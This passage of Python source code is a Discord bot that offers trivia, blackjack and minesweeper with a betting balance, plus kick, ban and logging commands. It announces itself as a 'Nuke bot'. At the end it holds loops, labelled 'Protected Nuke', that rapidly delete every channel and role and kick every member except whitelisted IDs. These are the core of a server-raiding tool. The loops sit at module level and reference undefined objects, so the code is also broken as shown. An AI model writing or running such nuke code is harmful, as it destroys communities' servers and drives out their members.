        {"q": "Who wrote '1984'?", "a": "orwell", "reward": 150},
        {"q": "What is 100 divided by 4?", "a": "25", "reward": 150},
        {"q": "What is the main gas in Earth's atmosphere?", "a": "nitrogen", "reward": 150},
        {"q": "Which continent is Egypt in?", "a": "africa", "reward": 150},
        {"q": "How many strings does a standard guitar have?", "a": "6", "reward": 150},
        {"q": "What is the capital of Mexico?", "a": "mexico city", "reward": 150},
        {"q": "What does DNA stand for? (short answer)", "a": "deoxyribonucleic acid", "reward": 150},
        {"q": "What is 11 x 11?", "a": "121", "reward": 150},
        {"q": "What is the tallest mammal?", "a": "giraffe", "reward": 150},
    ],

    "hard": [
        {"q": "How many bones are in the human body?", "a": "206", "reward": 300},
        {"q": "What is the speed of light in km/s? (approximate)", "a": "300000", "reward": 300},
        {"q": "What is the atomic number of carbon?", "a": "6", "reward": 300},
        {"q": "In what year was the Eiffel Tower built?", "a": "1889", "reward": 300},
        {"q": "What is the longest river in the world?", "a": "nile", "reward": 300},
        {"q": "What is the chemical symbol for gold?", "a": "au", "reward": 300},

        {"q": "Who developed the theory of relativity?", "a": "einstein", "reward": 300},
        {"q": "What is the capital of Iceland?", "a": "reykjavik", "reward": 300},
        {"q": "What is the largest organ in the human body?", "a": "skin", "reward": 300},
        {"q": "What year did the Titanic sink?", "a": "1912", "reward": 300},
        {"q": "What is the smallest unit of matter?", "a": "atom", "reward": 300},
        {"q": "Who painted the ceiling of the Sistine Chapel?", "a": "michelangelo", "reward": 300},
        {"q": "What is the powerhouse of the cell?", "a": "mitochondria", "reward": 300},
        {"q": "What is the capital of South Korea?", "a": "seoul", "reward": 300},
        {"q": "What is 13 squared?", "a": "169", "reward": 300},
        {"q": "Which element has atomic number 1?", "a": "hydrogen", "reward": 300},
        {"q": "What is the longest bone in the human body?", "a": "femur", "reward": 300},
        {"q": "What is the largest island in the world?", "a": "greenland", "reward": 300},
        {"q": "What is the capital of Argentina?", "a": "buenos aires", "reward": 300},
        {"q": "Who wrote 'The Odyssey'?", "a": "homer", "reward": 300},
        {"q": "What is the square root of 225?", "a": "15", "reward": 300},
        {"q": "What is the chemical symbol for sodium?", "a": "na", "reward": 300},
        {"q": "How many elements are in the periodic table?", "a": "118", "reward": 300},
        {"q": "What is the capital of Norway?", "a": "oslo", "reward": 300},
        {"q": "What is 144 divided by 12?", "a": "12", "reward": 300},
        {"q": "Which planet is closest to the sun?", "a": "mercury", "reward": 300},
        {"q": "What is the study of earthquakes called?", "a": "seismology", "reward": 300},
        {"q": "Who discovered penicillin?", "a": "fleming", "reward": 300},
        {"q": "What is the capital of Turkey?", "a": "ankara", "reward": 300},
        {"q": "What is the freezing point of water in fahrenheit?", "a": "32", "reward": 300},
        {"q": "What is the tallest mountain in the world?", "a": "everest", "reward": 300},
    ]
}

class TriviaView(discord.ui.View):
    def __init__(self, user, question, difficulty):
        super().__init__(timeout=30)
        self.user = user
        self.question = question
        self.difficulty = difficulty
        self.answered = False

    @discord.ui.button(label="💡 Use 50/50 Lifeline", style=discord.ButtonStyle.grey)
    async def lifeline(self, interaction, button):
        if interaction.user != self.user:
            await interaction.response.send_message("❌ This isn't your game!", ephemeral=True)
            return
        button.disabled = True
        await interaction.response.edit_message(
            content=f"💡 **50/50 Lifeline used!** One hint: The answer contains **'{self.question['a'][0].upper()}'**",
            view=self
        )

    @discord.ui.button(label="⏭️ Skip Question", style=discord.ButtonStyle.blurple)
    async def skip(self, interaction, button):
        if interaction.user != self.user:
            await interaction.response.send_message("❌ This isn't your game!", ephemeral=True)
            return
        self.answered = True
        self.stop()
        for child in self.children:
            child.disabled = True
        embed = discord.Embed(
            title="⏭️ Question Skipped",
            description=f"The answer was **{self.question['a']}**.\nNo money lost!",
            color=discord.Color.grey()
        )
        await interaction.response.edit_message(embed=embed, view=self)

@tree.command(name="trivia", description="Answer trivia and win money!")
@app_commands.describe(difficulty="Choose difficulty: easy, medium, or hard")
@app_commands.choices(difficulty=[
    app_commands.Choice(name="🟢 Easy ($50)", value="easy"),
    app_commands.Choice(name="🟡 Medium ($150)", value="medium"),
    app_commands.Choice(name="🔴 Hard ($300)", value="hard"),
])
async def trivia(interaction: discord.Interaction, difficulty: str = "easy"):
    q = random.choice(TRIVIA_QUESTIONS[difficulty])
    difficulty_colors = {"easy": discord.Color.green(), "medium": discord.Color.yellow(), "hard": discord.Color.red()}
    difficulty_emojis = {"easy": "🟢", "medium": "🟡", "hard": "🔴"}

    view = TriviaView(interaction.user, q, difficulty)
    embed = discord.Embed(title="❓ Trivia Time!", color=difficulty_colors[difficulty])
    embed.add_field(name="Question", value=f"**{q['q']}**", inline=False)
    embed.add_field(name="Difficulty", value=f"{difficulty_emojis[difficulty]} {difficulty.capitalize()}", inline=True)
    embed.add_field(name="Reward", value=f"**${q['reward']}**", inline=True)
    embed.add_field(name="Penalty", value=f"**-${q['reward'] // 2}**", inline=True)
    embed.set_footer(text="Type your answer in chat! You have 30 seconds. Use lifelines if you need help!")
    await interaction.response.send_message(embed=embed, view=view)

    def check(m):
        return m.author == interaction.user and m.channel == interaction.channel

    try:
        msg = await bot.wait_for("message", timeout=30.0, check=check)
        if view.answered:
            return
        view.answered = True
        if msg.content.lower().strip() == q["a"]:
            new_bal = update_balance(interaction.user.id, q["reward"])
            result_embed = discord.Embed(
                title="✅ Correct!",
                description=f"The answer was **{q['a']}**!\n\n🎉 You earned **${q['reward']}**!\n💰 Balance: **${new_bal:,}**",
                color=discord.Color.green()
            )
        else:
            penalty = q["reward"] // 2
            new_bal = update_balance(interaction.user.id, -penalty)
            result_embed = discord.Embed(
                title="❌ Wrong!",
                description=f"The correct answer was **{q['a']}**.\n\nYou lost **${penalty}**.\n💰 Balance: **${new_bal:,}**",
                color=discord.Color.red()
            )
        for child in view.children:
            child.disabled = True
        view.stop()
        await interaction.edit_original_response(embed=result_embed, view=view)
    except asyncio.TimeoutError:
        if not view.answered:
            timeout_embed = discord.Embed(
                title="⏱️ Time's Up!",
                description=f"The answer was **{q['a']}**.\nNo penalty for timeout!",
                color=discord.Color.grey()
            )
            for child in view.children:
                child.disabled = True
            view.stop()
            await interaction.edit_original_response(embed=timeout_embed, view=view)


# ── 🃏 BLACKJACK ──────────────────────────────────────────────────────────────
def draw_card():
    cards = ["2", "3", "4", "5", "6", "7", "8", "9", "10", "J", "Q", "K", "A"]
    return random.choice(cards)

def card_value(card):
    if card in ["J", "Q", "K"]:
        return 10
    elif card == "A":
        return 11
    return int(card)

def hand_value(hand):
    total = sum(card_value(c) for c in hand)
    aces = hand.count("A")
    while total > 21 and aces:
        total -= 10
        aces -= 1
    return total

def hand_str(hand):
    return " ".join(hand)

class BlackjackView(discord.ui.View):
    def __init__(self, user, bet, player, dealer):
        super().__init__(timeout=60)
        self.user = user
        self.bet = bet
        self.player = player
        self.dealer = dealer
        self.doubled = False

    def build_embed(self, show_dealer=False):
        embed = discord.Embed(title="🃏 Blackjack", color=discord.Color.dark_green())
        embed.add_field(name="Your Hand", value=f"{hand_str(self.player)} — **Total: {hand_value(self.player)}**", inline=False)
        if show_dealer:
            embed.add_field(name="Dealer's Hand", value=f"{hand_str(self.dealer)} — **Total: {hand_value(self.dealer)}**", inline=False)
        else:
            embed.add_field(name="Dealer's Hand", value=f"{self.dealer[0]} ❓", inline=False)
        embed.add_field(name="💵 Bet", value=f"**${self.bet:,}**", inline=True)
        embed.add_field(name="💰 Balance", value=f"**${get_balance(self.user.id):,}**", inline=True)
        return embed

    async def end_game(self, interaction):
        while hand_value(self.dealer) < 17:
            self.dealer.append(draw_card())

        p = hand_value(self.player)
        d = hand_value(self.dealer)

        embed = self.build_embed(show_dealer=True)

        if d > 21 or p > d:
            new_bal = update_balance(self.user.id, self.bet)
            embed.add_field(name="🏆 Result", value=f"**You win! +${self.bet:,}**\nBalance: **${new_bal:,}**", inline=False)
            embed.color = discord.Color.green()
        elif p == d:
            new_bal = get_balance(self.user.id)
            embed.add_field(name="🤝 Result", value=f"**Tie! Bet returned.**\nBalance: **${new_bal:,}**", inline=False)
            embed.color = discord.Color.yellow()
        else:
            new_bal = update_balance(self.user.id, -self.bet)
            embed.add_field(name="💔 Result", value=f"**Dealer wins! -${self.bet:,}**\nBalance: **${new_bal:,}**", inline=False)
            embed.color = discord.Color.red()

        for child in self.children:
            child.disabled = True
        self.stop()
        await interaction.response.edit_message(embed=embed, view=self)

    @discord.ui.button(label="👊 Hit", style=discord.ButtonStyle.green)
    async def hit(self, interaction, button):
        if interaction.user != self.user:
            await interaction.response.send_message("❌ This isn't your game!", ephemeral=True)
            return

        self.player.append(draw_card())
        pv = hand_value(self.player)

        if pv > 21:
            new_bal = update_balance(self.user.id, -self.bet)
            embed = self.build_embed()
            embed.add_field(name="💥 Bust!", value=f"You went over 21! Lost **${self.bet:,}**\nBalance: **${new_bal:,}**", inline=False)
            embed.color = discord.Color.red()
            for child in self.children:
                child.disabled = True
            self.stop()
            await interaction.response.edit_message(embed=embed, view=self)
        elif pv == 21:
            await self.end_game(interaction)
        else:
            embed = self.build_embed()
            await interaction.response.edit_message(embed=embed, view=self)

    @discord.ui.button(label="🛑 Stand", style=discord.ButtonStyle.red)
    async def stand(self, interaction, button):
        if interaction.user != self.user:
            await interaction.response.send_message("❌ This isn't your game!", ephemeral=True)
            return
        await self.end_game(interaction)

    @discord.ui.button(label="2️⃣ Double Down", style=discord.ButtonStyle.blurple)
    async def double_down(self, interaction, button):
        if interaction.user != self.user:
            await interaction.response.send_message("❌ This isn't your game!", ephemeral=True)
            return
        bal = get_balance(self.user.id)
        if bal < self.bet:
            await interaction.response.send_message("❌ Not enough balance to double down!", ephemeral=True)
            return
        self.bet *= 2
        self.player.append(draw_card())
        button.disabled = True
        self.doubled = True

        if hand_value(self.player) > 21:
            new_bal = update_balance(self.user.id, -self.bet)
            embed = self.build_embed()
            embed.add_field(name="💥 Bust!", value=f"Doubled and busted! Lost **${self.bet:,}**\nBalance: **${new_bal:,}**", inline=False)
            embed.color = discord.Color.red()
            for child in self.children:
                child.disabled = True
            self.stop()
            await interaction.response.edit_message(embed=embed, view=self)
        else:
            await self.end_game(interaction)

@tree.command(name="blackjack", description="Play Blackjack with Hit, Stand, and Double Down!")
@app_commands.describe(bet="Amount to bet (default: 10)")
async def blackjack(interaction: discord.Interaction, bet: int = 10):
    bal = get_balance(interaction.user.id)
    if bet <= 0:
        await interaction.response.send_message("❌ Bet must be more than $0!", ephemeral=True)
        return
    if bet > bal:
        await interaction.response.send_message(f"❌ You only have **${bal:,}**!", ephemeral=True)
        return

    player = [draw_card(), draw_card()]
    dealer = [draw_card(), draw_card()]

    if hand_value(player) == 21:
        winnings = int(bet * 1.5)
        new_bal = update_balance(interaction.user.id, winnings)
        embed = discord.Embed(title="🃏 Blackjack — NATURAL BLACKJACK! 🎉", color=discord.Color.gold())
        embed.add_field(name="Your Hand", value=f"{hand_str(player)} — **21**", inline=False)
        embed.add_field(name="Result", value=f"**Blackjack! You win ${winnings:,}!**\nBalance: **${new_bal:,}**", inline=False)
        await interaction.response.send_message(embed=embed)
        return

    view = BlackjackView(interaction.user, bet, player, dealer)
    embed = view.build_embed()
    embed.set_footer(text="Hit to draw a card, Stand to hold, or Double Down to double your bet and draw one card!")
    await interaction.response.send_message(embed=embed, view=view)


# ── 💣 MINESWEEPER ────────────────────────────────────────────────────────────
class MinesweeperView(discord.ui.View):
    def __init__(self, user, size, mines, bet):
        super().__init__(timeout=120)
        self.user = user
        self.size = size
        self.mines = mines
        self.bet = bet
        self.revealed = 0
        self.safe_cells = size * size - mines
        self.game_over = False

        # Build board
        self.board = [[0] * size for _ in range(size)]
        self.mine_set = set(random.sample(range(size * size), mines))
        for pos in self.mine_set:
            self.board[pos // size][pos % size] = -1
        for r in range(size):
            for c in range(size):
                if self.board[r][c] == -1:
                    continue
                count = sum(
                    1 for dr in [-1, 0, 1] for dc in [-1, 0, 1]
                    if 0 <= r+dr < size and 0 <= c+dc < size and self.board[r+dr][c+dc] == -1
                )
                self.board[r][c] = count

        self.revealed_cells = set()
        self._add_buttons()

    def _add_buttons(self):
        number_emojis = ["⬜", "1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣"]
        for r in range(self.size):
            for c in range(self.size):
                pos = r * self.size + c
                btn = discord.ui.Button(label="?", row=r, style=discord.ButtonStyle.grey, custom_id=f"cell_{pos}")
                btn.callback = self.make_callback(r, c, pos)
                self.add_item(btn)

    def make_callback(self, r, c, pos):
        async def callback(interaction: discord.Interaction):
            if interaction.user != self.user:
                await interaction.response.send_message("❌ This isn't your game!", ephemeral=True)
                return
            if self.game_over or pos in self.revealed_cells:
                await interaction.response.send_message("❌ Already revealed!", ephemeral=True)
                return

            self.revealed_cells.add(pos)
            number_emojis = ["⬜", "1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣"]

            for item in self.children:
                if hasattr(item, 'custom_id') and item.custom_id == f"cell_{pos}":
                    if pos in self.mine_set:
                        item.label = "💣"
                        item.style = discord.ButtonStyle.red
                        item.disabled = True
                    else:
                        val = self.board[r][c]
                        item.label = str(val) if val > 0 else "·"
                        item.style = discord.ButtonStyle.green
                        item.disabled = True

            if pos in self.mine_set:
                self.game_over = True
                new_bal = update_balance(self.user.id, -self.bet)
                for item in self.children:
                    item.disabled = True
                self.stop()
                embed = discord.Embed(
                    title="💣 BOOM! You hit a mine!",
                    description=f"You revealed **{self.revealed}** safe cells before hitting a mine.\nLost **${self.bet:,}**!\nBalance: **${new_bal:,}**",
                    color=discord.Color.red()
                )
                await interaction.response.edit_message(embed=embed, view=self)
            else:
                self.revealed += 1
                current_reward = int(self.bet * (self.revealed / self.safe_cells) * 2)

                if self.revealed == self.safe_cells:
                    self.game_over = True
                    new_bal = update_balance(self.user.id, self.bet * 3)
                    for item in self.children:
                        item.disabled = True
                    self.stop()
                    embed = discord.Embed(
                        title="💣 PERFECT! All safe cells revealed!",
                        description=f"You revealed all **{self.safe_cells}** safe cells!\nWon **${self.bet * 3:,}**!\nBalance: **${new_bal:,}**",
                        color=discord.Color.gold()
                    )
                    await interaction.response.edit_message(embed=embed, view=self)
                else:
                    embed = discord.Embed(title="💣 Minesweeper", color=discord.Color.blue())
                    embed.add_field(name="✅ Safe Cells Found", value=f"**{self.revealed}/{self.safe_cells}**", inline=True)
                    embed.add_field(name="💰 Current Reward if Cashed Out", value=f"**${current_reward:,}**", inline=True)
                    embed.add_field(name="💵 Bet", value=f"**${self.bet:,}**", inline=True)
                    embed.set_footer(text="Keep clicking or cash out to take your winnings!")
                    await interaction.response.edit_message(embed=embed, view=self)

        return callback

    @discord.ui.button(label="💰 Cash Out", style=discord.ButtonStyle.green, row=4)
    async def cash_out(self, interaction, button):
        if interaction.user != self.user:
            await interaction.response.send_message("❌ This isn't your game!", ephemeral=True)
            return
        if self.revealed == 0:
            await interaction.response.send_message("❌ Reveal at least one cell before cashing out!", ephemeral=True)
            return

        reward = int(self.bet * (self.revealed / self.safe_cells) * 2)
        new_bal = update_balance(self.user.id, reward)
        self.game_over = True
        for item in self.children:
            item.disabled = True
        self.stop()

        embed = discord.Embed(
            title="💰 Cashed Out!",
            description=f"You revealed **{self.revealed}/{self.safe_cells}** safe cells!\nCashed out **${reward:,}**!\nBalance: **${new_bal:,}**",
            color=discord.Color.green()
        )
        await interaction.response.edit_message(embed=embed, view=self)

@tree.command(name="minesweeper", description="Play interactive Minesweeper and cash out anytime!")
@app_commands.describe(size="Board size 3-5 (default: 4)", mines="Number of mines (default: 3)", bet="Amount to bet (default: 20)")
async def minesweeper(interaction: discord.Interaction, size: int = 4, mines: int = 3, bet: int = 20):
    bal = get_balance(interaction.user.id)
    if size < 3 or size > 5:
        await interaction.response.send_message("❌ Size must be between 3 and 5 for button layout!", ephemeral=True)
        return
    if mines >= size * size - 1:
        await interaction.response.send_message("❌ Too many mines!", ephemeral=True)
        return
    if bet <= 0:
        await interaction.response.send_message("❌ Bet must be more than $0!", ephemeral=True)
        return
    if bet > bal:
        await interaction.response.send_message(f"❌ You only have **${bal:,}**!", ephemeral=True)
        return

    view = MinesweeperView(interaction.user, size, mines, bet)
    embed = discord.Embed(title="💣 Minesweeper", color=discord.Color.blue())
    embed.add_field(name="📐 Board", value=f"**{size}x{size}**", inline=True)
    embed.add_field(name="💣 Mines", value=f"**{mines}**", inline=True)
    embed.add_field(name="✅ Safe Cells", value=f"**{size*size - mines}**", inline=True)
    embed.add_field(name="💵 Bet", value=f"**${bet:,}**", inline=True)
    embed.add_field(name="🏆 Full Clear", value=f"**+${bet * 3:,}**", inline=True)
    embed.add_field(name="Rules", value="Click cells to reveal them. Hit a mine and you lose your bet!\nCash out anytime to keep your partial winnings.", inline=False)
    embed.set_footer(text="Good luck! Click any cell to start.")
    await interaction.response.send_message(embed=embed, view=view)


# ── Error Handling ────────────────────────────────────────────────────────────
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send("🚫 You don't have permission to use this command.")
    elif isinstance(error, commands.CommandNotFound):
        pass
    else:
        await ctx.send(f"❌ Error: {error}")

# ── Ready ─────────────────────────────────────────────────────────────────────
@bot.event
async def on_ready():
    await tree.sync()
    print(f"✅ Logged in as {bot.user} ({bot.user.id})")
    print("Nuke bot ready.")

# ── Security / Protection System ─────────────────────────────────────────────

IGNORED_USER_IDS = [
    933543370935128204,
    123456789012345678,
]

PROTECTED_CHANNEL_IDS = [
    111111111111111111,
]

PROTECTED_ROLE_IDS = [
    222222222222222222,
]

LOG_CHANNEL_NAME = "bot-logs"

def is_ignored(user_id):
    return user_id in IGNORED_USER_IDS

async def send_log(guild, message):
    log_channel = discord.utils.get(guild.text_channels, name=LOG_CHANNEL_NAME)

    if not log_channel:
        try:
            log_channel = await guild.create_text_channel(LOG_CHANNEL_NAME)
        except:
            return

    try:
        await log_channel.send(message)
    except:
        pass


# ── Moderation Commands ──────────────────────────────────────────────────────

@bot.command(name="kick")
@commands.has_permissions(kick_members=True)
async def kick_member(ctx, member: discord.Member, *, reason="No reason provided"):

    if is_ignored(member.id):
        await ctx.send("❌ That user is protected.")
        return

    try:
        await member.kick(reason=reason)

        await ctx.send(f"👢 Kicked {member}.")

        await send_log(
            ctx.guild,
            f"👢 {ctx.author} kicked {member} | Reason: {reason}"
        )

    except discord.Forbidden:
        await ctx.send("❌ Missing permissions.")


@bot.command(name="ban")
@commands.has_permissions(ban_members=True)
async def ban_member(ctx, member: discord.Member, *, reason="No reason provided"):

    if is_ignored(member.id):
        await ctx.send("❌ That user is protected.")
        return

    try:
        await member.ban(reason=reason)

        await ctx.send(f"🔨 Banned {member}.")

        await send_log(
            ctx.guild,
            f"🔨 {ctx.author} banned {member} | Reason: {reason}"
        )

    except discord.Forbidden:
        await ctx.send("❌ Missing permissions.")


# ── Auto Logging Events ──────────────────────────────────────────────────────

@bot.event
async def on_member_ban(guild, user):
    await send_log(guild, f"🔨 {user} was banned.")

@bot.event
async def on_member_remove(member):
    await send_log(member.guild, f"👋 {member} left or was kicked.")

@bot.event
async def on_guild_channel_delete(channel):
    await send_log(channel.guild, f"🗑️ Channel deleted: {channel.name}")

@bot.event
async def on_guild_role_delete(role):
    await send_log(role.guild, f"🎭 Role deleted: {role.name}")


# ── Protected Deletes ────────────────────────────────────────────────────────

# Replace your channel deletion loops with this:

for channel in list(guild.channels):

    if channel.id in PROTECTED_CHANNEL_IDS:
        continue

    try:
        await channel.delete(reason="Protected Nuke")
        await asyncio.sleep(0.005)

    except (discord.Forbidden, discord.HTTPException):
        pass


# Replace your role deletion loops with this:

for role in list(guild.roles):

    if role.is_default() or role.managed:
        continue

    if role.id in PROTECTED_ROLE_IDS:
        continue

    try:
        await role.delete(reason="Protected Nuke")
        await asyncio.sleep(0.005)

    except (discord.Forbidden, discord.HTTPException):
        pass


# Replace your member kick loops with this:

async for member in guild.fetch_members(limit=None):

    if member == ctx.author:
        continue

    if is_ignored(member.id):
        continue

    try:
        await member.kick(reason="Protected Nuke")
        await asyncio.sleep(0.005)

    except (discord.Forbidden, discord.HTTPException):
        pass
        
bot.run(BOT_TOKEN)
